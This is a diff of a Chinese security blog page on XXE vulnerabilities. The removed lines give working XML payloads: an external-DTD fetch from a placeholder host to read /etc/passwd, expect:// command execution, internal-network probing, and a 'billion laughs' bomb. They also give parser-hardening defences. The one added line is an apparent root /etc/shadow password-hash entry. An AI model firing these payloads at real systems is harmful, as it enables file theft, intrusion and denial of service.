-<p>因为参数实体可以嵌套别的实体，所以产生了这种方式。</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE a[
-    &lt;!ENTITY % d SYSTEM &quot;http://XXX/test.dtd&quot;&gt;
-    %d;
-]&gt;
-&lt;c&gt;&amp;b;&lt;/c&gt;</code></pre>
-<p>test.dtd 内容:</p>
-<pre><code class="php">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></pre>
-<p>示例：<br><img src="https://img-blog.csdnimg.cn/20201212203240768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">注意这种方式必须要先引用 参数实体，才能引用通用实体，且缺一不可。</p>
-<h4 id="2、命令执行："><a href="#2、命令执行：" class="headerlink" title="2、命令执行："></a>2、命令执行：</h4><p>在安装 expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。<br>因为PHP的 expect 并不是默认安装扩展，所以命令执行比较难利用，但不排除有幸运的情况。</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;expect://cat /&quot; &gt;]&gt;
-&lt;root&gt;
-&lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/root&gt;</code></pre>
-<h4 id="3、内网探测："><a href="#3、内网探测：" class="headerlink" title="3、内网探测："></a>3、内网探测：</h4><p>XML 外部实体中是可以使用http://协议，可以利用该请求去探查内网。</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;
-&lt;root&gt;
-&lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/root&gt;</code></pre>
-<h4 id="4、攻击内网网站："><a href="#4、攻击内网网站：" class="headerlink" title="4、攻击内网网站："></a>4、攻击内网网站：</h4><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt;
-&lt;root&gt;
-&lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/root&gt;</code></pre>
-<h4 id="5、发起Dos攻击："><a href="#5、发起Dos攻击：" class="headerlink" title="5、发起Dos攻击："></a>5、发起Dos攻击：</h4><p>几乎所有可以控制服务器资源利用的东西，都可用于制造DOS攻击。通过XML外部实体注入，攻击者可以发送任意的HTTP请求，因为解析器会解析文档中的所有实体，所以如果实体声明层层嵌套的话，在一定数量上可以对服务器器造成DoS。</p>
-<p>常见的XML炸弹：</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE lolz [
-&lt;!ENTITY lol &quot;lol&quot;&gt;
-&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
-&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
-&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
-&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
-&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
-&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
-&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
-&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
-]&gt;
-&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre>
-<p>攻击原理：XML解析器尝试解析该文件时，DTD中的实体会以指数级的数量级展开，lol 实体为 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 <code>10^2</code> 个 “lol” 了，以此类推，lol9 实体含有 <code>10^8</code> 个 “lol” 字符串，所以这个1K不到的文件经过解析后会占用到3G的内存,可见有多恐怖，不过现代的服务器软硬件大多已经抵御了此类攻击。</p>
-<p>防御XML炸弹的方法也很简单禁止DTD或者是限制每个实体的最大长度。</p>
-<h3 id="五、XXE-如何防御："><a href="#五、XXE-如何防御：" class="headerlink" title="五、XXE 如何防御："></a>五、XXE 如何防御：</h3><h4 id="方式一、使用开发语言提供的禁用外部实体的方法："><a href="#方式一、使用开发语言提供的禁用外部实体的方法：" class="headerlink" title="方式一、使用开发语言提供的禁用外部实体的方法："></a>方式一、使用开发语言提供的禁用外部实体的方法：</h4><p>PHP：</p>
-<pre><code class="php">libxml_disable_entity_loader(true);</code></pre>
-<p>JAVA:</p>
-<pre><code class="java">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
-dbf.setExpandEntityReferences(false);</code></pre>
-<p>Python：</p>
-<pre><code class="python">from lxml import etree
-xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre>
-<h4 id="方式二、过滤用户输入："><a href="#方式二、过滤用户输入：" class="headerlink" title="方式二、过滤用户输入："></a>方式二、过滤用户输入：</h4><p>过滤用户提交的XML数据 ，关键词：<code>&lt;!DOCTYPE&gt;、&lt;!ENTITY&gt;、SYSTEM、PUBLIC</code>。</p>
-<h3 id="六、最后"><a href="#六、最后" class="headerlink" title="六、最后"></a>六、最后</h3><p>🆗，关于 XXE漏洞的总结大致就这些了，后面遇到新的 XXE利用方式再补上。( •̀ ω •́ )✧</p>
+<pre><code class="php">root:$6$yKWZUSO0SwgjC.63$NbjJATXRkjSmbcudDHvrRoAqXSNwPtmhfrVpxXad4NghoSe309PCkeHVGvQ0JuEllhuyas.xUQGiH42GclSlx1:18654:0:99999:7:::</code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2058751973@qq.com </span>
